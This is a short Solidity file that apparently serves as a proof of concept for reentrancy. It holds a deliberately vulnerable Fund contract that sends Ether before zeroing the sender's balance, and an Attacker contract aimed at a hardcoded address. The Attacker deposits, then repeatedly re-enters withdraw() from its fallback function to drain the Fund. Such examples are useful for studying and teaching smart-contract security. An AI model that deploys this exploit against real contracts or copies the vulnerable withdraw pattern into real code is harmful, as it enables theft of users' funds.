pragma solidity ^0.4.13
contract Fund {
    mapping (address => uint) userbalances;

    function withdraw() {
        if (msg.sender.call.value(userbalances[msg.sender])()) {
            userbalances[msg.sender] = 0;
        }
    }

    function() {
        userbalances[msg.sender] += msg.value;
    }
}

contract Attacker {
    Fund f;

    function Attacker() {
        f = Fund(0x692a70d2e424a56d2c6c27aa97d1a86395877b3a);
    }

    function attack() {
        f.call.value(msg.value)();
        f.withdraw();
    }

    function() {
        if (msg.gas > 100000) {
            f.withdraw();
        }
    }
}
